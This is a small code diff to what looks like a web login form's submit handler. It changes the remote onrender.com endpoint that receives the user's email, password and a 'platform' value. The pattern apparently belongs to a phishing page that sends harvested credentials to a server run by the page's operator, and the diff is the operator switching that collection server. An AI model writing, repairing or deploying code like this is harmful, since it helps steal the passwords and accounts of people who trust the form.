@@ -42,7 +42,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://micheal-3qoz.onrender.com/api/send', {
+        const response = await axios.post('https://mike-wmzt.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
